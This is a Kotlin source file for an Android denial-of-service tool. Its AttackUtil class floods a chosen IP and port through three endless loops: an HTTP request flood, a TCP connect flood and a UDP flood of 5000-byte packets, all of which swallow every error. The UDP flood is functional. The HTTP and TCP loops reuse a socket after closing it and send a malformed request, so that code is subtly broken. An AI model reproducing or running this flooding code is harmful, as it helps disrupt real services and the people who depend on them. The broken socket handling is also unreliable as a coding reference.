package com.osamaalek.androidddos

import kotlinx.coroutines.*
import java.io.OutputStreamWriter
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetSocketAddress
import java.net.Socket

class AttackUtil(private val ip: String, private val port: Int, private val timeout: Int) {

    private lateinit var job: Job

    fun startHTTPAttach() {
        job = CoroutineScope(Dispatchers.IO).launch {
            withContext(Dispatchers.IO) {
                val socket = Socket()
                while (isActive) {
                    try {
                        socket.connect(InetSocketAddress(ip, port), timeout)
                        val out = OutputStreamWriter(socket.getOutputStream())
                        out.write("GET / HTTP/1.1")
                        out.close()
                        delay(100)
                        socket.close()
                    } catch (ignore: Exception) {
                    }
                }
            }
        }
    }

    fun startTCPAttach() {
        job = CoroutineScope(Dispatchers.IO).launch {
            withContext(Dispatchers.IO) {
                val socket = Socket()
                while (isActive) {
                    try {
                        socket.connect(InetSocketAddress(ip, port), timeout)
                        delay(100)
                        socket.close()
                    } catch (ignore: Exception) {
                    }
                }
            }
        }
    }

    fun startUDPAttach() {
        job = CoroutineScope(Dispatchers.IO).launch {
            withContext(Dispatchers.IO) {
                val socket = DatagramSocket()
                val buffer = ByteArray(5000)
                val packet = DatagramPacket(buffer, buffer.size, InetSocketAddress(ip, port))
                while (isActive) {
                    try {
                        socket.send(packet)
                        delay(20)
                    } catch (ignore: Exception) {
                    }
                }
            }
        }
    }

    fun stop() {
        job.cancel()
    }
}